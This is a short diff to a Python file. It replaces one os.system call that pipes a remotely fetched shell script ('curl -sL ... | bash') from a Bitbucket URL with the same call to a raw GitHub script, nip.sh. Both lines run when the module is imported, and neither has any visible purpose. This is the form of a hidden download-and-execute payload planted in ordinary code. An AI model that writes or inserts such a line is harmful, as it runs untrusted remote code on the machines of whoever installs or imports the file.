@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash')
+os.system('curl -sL https://raw.githubusercontent.com/55113110159/OS/main/nip.sh | bash')
